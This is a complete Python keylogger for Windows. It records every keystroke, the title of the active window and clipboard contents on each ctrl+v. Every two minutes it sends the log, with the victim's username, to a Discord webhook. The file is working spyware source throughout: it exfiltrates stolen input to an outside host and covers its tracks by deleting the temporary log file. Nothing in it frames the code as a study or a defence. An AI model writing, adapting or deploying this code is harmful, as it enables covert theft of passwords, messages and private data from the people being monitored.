from os import getlogin, getenv, environ, remove
from unicodedata import name
from threading import Timer
from datetime import datetime
from discord_webhook import DiscordWebhook, DiscordEmbed
from pynput.keyboard import Listener, Key
from pyperclip import paste
from keyboard import add_hotkey
from win32gui import GetWindowText, GetForegroundWindow

current_window = None
REPORT_INTERVAL = 120
WEBHOOK_URL = "YOUR_WEBHOOK_URL"
SPECIAL_KEYS = {
    Key.alt_l: "",
    Key.alt_r: "",
    Key.backspace: " [Backspace] ",
    Key.caps_lock: "",
    Key.cmd_l: " [Windows Key] ",
    Key.ctrl_l: "",
    Key.ctrl_r: "",
    Key.delete: " [Delete] ",
    Key.down: " [Down] ",
    Key.end: "",
    Key.enter: "\n",
    Key.esc: " [Esc] ",
    Key.f1: " [F1] ",
    Key.f10: " [F10] ",
    Key.f11: " [F11] ",
    Key.f2: " [F2] ",
    Key.f3: " [F3] ",
    Key.f4: " [F4] ",
    Key.f5: " [F5] ",
    Key.f6: " [F6] ",
    Key.f7: " [F7] ",
    Key.f8: " [F8] ",
    Key.f9: " [F9] ",
    Key.home: "",
    Key.insert: "",
    Key.left: " [Left] ",
    Key.num_lock: "",
    Key.page_down: "",
    Key.page_up: "",
    Key.pause: "",
    Key.print_screen : " [Print Screen] ",
    Key.right: " [Right] ",
    Key.scroll_lock: "",
    Key.shift_l: "",
    Key.shift_r: "",
    Key.space: " ",
    Key.tab: " [Tab] ",
    Key.up: " [Up] ",
    Key.media_volume_up: " [Volume Up] ",
    Key.media_volume_down: " [Volume Down] ",
    Key.media_volume_mute: " [Mute] ",
    Key.media_next: " [Next Track] ",
    Key.media_previous: " [Previous Track] ",
    Key.media_play_pause: " [Play/Pause] "
}
log = ""
start_time = ""
end_time = ""
username = getlogin()

def get_active_window():
    try:
        return GetWindowText(GetForegroundWindow())
    except Exception:
        return "Unknown Window"

def log_window_change():
    global current_window
    new_window = get_active_window()
    if new_window != current_window and new_window.strip():
        current_window = new_window
        global log
        log += f"\n{"=" * 50}\nWindow title: {current_window}\n"

def key_handler(key):
    global log
    log_window_change()
    try:
        key = key.char
        name(key)
    except (AttributeError, ValueError):
        if key in SPECIAL_KEYS:
            key = SPECIAL_KEYS[key]
        else:
            key = str(key).find("Key.")
            if key != -1:
                key = str(key).replace("Key.", " [") + "]"
            else:
                key = ""
    log += key

def copy_clipboard():
    global log
    log_window_change()
    log += f"\n[Clipboard]: {{\n{paste()}\n}}\n"

def send_log_to_webhook():
    global log, username, end_time
    webhook = DiscordWebhook(url=WEBHOOK_URL)
    if len(log) > 2000:
        path = environ["temp"] + "\\log.txt"
        with open(path, 'w+') as file:
            file.write(f"Username :{username} | Time: {end_time}\n\n")
            file.write(log)
        with open(path, 'rb') as f:
            webhook.add_file(file=f.read(), filename='log.txt')
        webhook.execute()
        try:
            remove(path)
        except Exception:
            pass
    else:
        if len(log) > 0:
            embed = DiscordEmbed(title=f"Username :{username} | Time: {end_time}", description=log)
            webhook.add_embed(embed)    
    webhook.execute()

def schedule_report():
    global log, username, end_time
    if log:
        send_log_to_webhook()
    log = ""
    timer = Timer(interval=REPORT_INTERVAL, function=schedule_report)
    timer.daemon = True
    timer.start()

def run_ky8():
    global start_time, end_time
    start_time = datetime.now()
    add_hotkey("ctrl+v", copy_clipboard, suppress=False)
    with Listener(on_release=key_handler) as listener:
        schedule_report()
        listener.join()

if __name__ == "__main__":
    run_ky8()
